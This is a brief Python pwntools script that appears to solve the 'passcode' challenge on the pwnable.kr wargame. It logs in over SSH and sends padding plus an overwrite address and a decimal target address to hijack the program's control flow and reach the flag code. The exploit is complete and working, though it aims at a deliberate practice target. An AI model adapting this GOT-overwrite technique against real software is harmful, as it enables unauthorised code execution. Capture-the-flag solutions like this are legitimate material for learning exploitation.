from pwn import *

p = ssh('passcode', 'pwnable.kr', 2222, 'guest')
s = p.process('./passcode')
padding = b'A' * 96
passcodes = b'\x14\xc0\x04\x08'
payload = padding + passcodes
s.sendlineafter(" : ", payload)
s.sendlineafter(" : ", b"134517406")
s.interactive()